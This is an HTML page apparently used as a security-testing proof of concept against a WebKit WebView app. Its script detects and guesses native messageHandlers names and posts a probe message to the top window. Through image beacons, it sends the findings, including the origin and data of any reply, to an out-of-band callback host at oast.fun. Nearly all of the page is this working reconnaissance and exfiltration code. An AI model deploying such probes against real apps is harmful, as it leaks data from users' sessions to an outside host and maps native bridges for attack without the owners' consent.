<!doctype html>
<html>
<head><meta charset="utf-8"><title>probe: webkit & postMessage</title></head>
<body>
<h4>Probe running</h4>
<script>
const LOG = (k,v) => {
  try {
    const img = new Image();
    img.src = 'https://styjqnwddatiiruxgbjsz9efjnj4hdpyv.oast.fun/log.png?test=' + encodeURIComponent(k) + '&v=' + encodeURIComponent(String(v)) + '&t=' + Date.now();
    document.body.appendChild(img);
  } catch(e){}
};

// 1) basic load
LOG('loaded', 1);

// 2) detect webkit object presence
const hasWebkit = typeof window.webkit !== 'undefined' && typeof window.webkit.messageHandlers !== 'undefined';
LOG('webkit_present', hasWebkit ? 1 : 0);

// 3) try to enumerate handler names SAFELY (no calls)
// Note: many handlers are non-enumerable; try some heuristics but do NOT call them.
(function enumerateHandlers(){
  try{
    const handlers = [];
    try {
      // best-effort: Object.keys (may be empty)
      const keys = Object.keys(window.webkit && window.webkit.messageHandlers || {});
      if(keys && keys.length) handlers.push(...keys);
    } catch(e){}
    // common handler name guesses (safe detection only)
    const guesses = ['sendMessage','postMessage','nativeHandler','bridge','send','log','onMessage'];
    guesses.forEach(name => {
      try {
        if(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers[name]) {
          handlers.push(name);
        }
      } catch(e){}
    });
    const uniq = Array.from(new Set(handlers));
    LOG('webkit_handlers', uniq.length ? uniq.join(',') : 'none');
  }catch(e){
    LOG('webkit_enumerate_err', String(e));
  }
})();

// 4) postMessage test: send message to top and wait for response
(function postMessageTest(){
  const id = 'poc-' + Math.floor(Math.random()*1e6);
  // listen for response
  let responded = false;
  function onMsg(ev){
    try{
      // record origin and data
      const od = (ev && ev.origin) ? ev.origin : 'unknown';
      const data = (ev && ev.data) ? JSON.stringify(ev.data).slice(0,500) : 'nodata';
      LOG('postmsg_response_origin', od + '|' + data);
      responded = true;
    }catch(e){
      LOG('postmsg_response_err', String(e));
    }
  }
  window.addEventListener('message', onMsg, false);
  // send message
  try{
    window.top.postMessage({type:'poc_probe', id: id, ts: Date.now()}, '*');
    LOG('postmsg_sent', id);
  }catch(e){
    LOG('postmsg_send_err', String(e));
  }
  // after 5s, if no response, log timeout
  setTimeout(()=> {
    if(!responded) LOG('postmsg_no_response', 1);
    // cleanup
    try{ window.removeEventListener('message', onMsg); }catch(e){}
    LOG('probe_done', 1);
  }, 5000);
})();
</script>
</body>
</html>
